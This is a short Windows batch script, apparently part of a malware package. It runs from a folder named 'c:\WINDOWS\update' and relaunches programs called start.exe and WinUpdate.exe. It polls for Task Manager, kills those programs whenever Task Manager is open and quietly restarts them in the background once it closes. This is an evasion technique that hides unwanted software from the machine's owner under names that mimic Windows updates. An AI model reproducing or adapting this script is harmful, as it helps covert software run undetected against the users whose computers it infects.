@echo off
cd "c:\WINDOWS\update"
pv -f -k start.exe
pv -f -k WinUpdate.exe

if not %OS%==Windows_NT goto win9x

set x=0
set n=0
:deb
set k=0
pv -d 5000
for /f %%i in ('pv ^| find "taskmgr.exe"') do ( set k=1 )
if %k%==1 if %x%==1 (
	pv -f -k start.exe
	pv -f -k WinUpdate.exe
	set n=0
	pv -d 20000
	)
if %k%==0 if %x%==0 (
	start /b start.exe
	set n=1
	)
set x=%n%
goto deb
)

:win9x
start.exe
